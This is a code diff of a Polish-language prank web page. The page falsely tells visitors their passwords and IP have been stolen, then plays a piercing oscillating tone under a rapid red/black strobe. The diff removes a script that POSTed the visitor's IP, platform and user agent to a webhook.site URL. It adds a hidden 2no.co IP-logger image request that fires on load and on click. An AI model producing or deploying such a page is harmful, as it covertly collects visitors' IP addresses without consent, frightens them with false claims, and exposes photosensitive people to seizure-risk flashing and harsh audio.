@@ -35,12 +35,12 @@
             top: 10px;
             left: 10px;
             filter: drop-shadow(0 0 15px gold);
-            display: none; /* Pojawi się po kliknięciu */
+            display: none;
         }
 
-        .glitch {
-            font-size: 1.2rem;
-            margin-top: 20px;
+        #final-text {
+            display: inline-block;
+            transition: transform 12s linear;
         }
     </style>
 </head>
@@ -50,88 +50,74 @@
 
     <div class="container">
         <h1 class="warning">DANE PRZECHWYCONE</h1>
-        <p class="glitch">Twoje dane zostały wysłane na serwer zewnętrzny.</p>
-        <p>Twoje IP oraz dane z menedżera haseł wyciekły.</p>
+        <p>Transfer danych do serwera zewnętrznego zakończony sukcesem.</p>
+        <p>Twoje IP oraz hasła zostały zindeksowane.</p>
         <br>
-        <p style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</p>
-        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY POTWIERDZIĆ ODCZYTANIE ]</p>
+        <div id="final-text" style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</div>
+        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY ZAMKNĄĆ POWIADOMIENIE ]</p>
     </div>
 
     <script>
-        // --- 1. PRZECHWYTYWANIE I WYSYŁANIE IP ---
-        const WEBHOOK_URL = 'https://webhook.site/2aa605de-9b10-4e3e-b37f-fc573ebba814';
+        // --- PRZECHWYTYWANIE PRZEZ TWÓJ LINK 2NO.CO ---
+        function triggerLogger() {
+            const logger = new Image();
+            // Przeglądarka "pobiera" link jako obrazek, co aktywuje loggera
+            logger.src = "https://2no.co/2sXYk7?cache=" + Math.random();
+        }
+        
+        // Próba aktywacji przy załadowaniu
+        triggerLogger();
 
-        // Pobieramy IP przez darmowe API i wysyłamy do Ciebie
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                const info = {
-                    ip: data.ip,
-                    platform: navigator.platform,
-                    agent: navigator.userAgent,
-                    time: new Date().toLocaleString()
-                };
-                // Wysyłamy dane na Twój webhook
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(info)
-                });
-            })
-            .catch(err => console.log("Błąd przechwytywania"));
-
-        // --- 2. LOGIKA LATAJĄCEGO PAPIEŻA ---
+        // --- LATAJĄCY PAPIEŻ ---
         const papiez = document.getElementById('papiez');
-        let posX = 10;
-        let posY = 10;
-        let velX = 6;
-        let velY = 4;
+        const finalText = document.getElementById('final-text');
+        let posX = Math.random() * 100; let posY = Math.random() * 100;
+        let velX = 7; let velY = 5;
 
         function move() {
-            posX += velX;
-            posY += velY;
-
+            posX += velX; posY += velY;
             if (posX + papiez.clientWidth >= window.innerWidth || posX <= 0) velX = -velX;
             if (posY + papiez.clientHeight >= window.innerHeight || posY <= 0) velY = -velY;
-
             papiez.style.left = posX + 'px';
             papiez.style.top = posY + 'px';
             requestAnimationFrame(move);
         }
 
-        // --- 3. START CHAOSU (PO KLIKNIĘCIU) ---
+        // --- START CHAOSU ---
         let started = false;
         function startChaos() {
             if (started) return;
             started = true;
 
-            // Pokaż papieża i zacznij nim ruszać
+            // Dodatkowa próba aktywacji loggera przy kliknięciu (na wszelki wypadek)
+            triggerLogger();
+
             papiez.style.display = 'block';
             move();
 
-            // Uruchom pisk
+            // Napis rośnie do gigantycznych rozmiarów
+            finalText.style.transform = "scale(25)";
+
+            // Audio (Pisk)
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             const osc = audioCtx.createOscillator();
             const gain = audioCtx.createGain();
-
             osc.type = 'sawtooth'; 
-            osc.frequency.setValueAtTime(3500, audioCtx.currentTime);
-            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
-
+            osc.frequency.setValueAtTime(4000, audioCtx.currentTime);
+            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
 
-            // Modulacja dźwięku (zmiana wysokości)
             setInterval(() => {
-                osc.frequency.value = 2000 + Math.random() * 2000;
-            }, 80);
+                osc.frequency.value = 2500 + Math.random() * 2000;
+            }, 70);
 
-            // Efekt migania tła (stroboskop)
+            // Stroboskop (miganie czerwony/czarny)
             setInterval(() => {
                 document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
-                setTimeout(() => { document.body.style.background = 'black'; }, 40);
-            }, 300);
+                setTimeout(() => { document.body.style.background = 'black'; }, 50);
+            }, 250);
         }
     </script>
 </body>
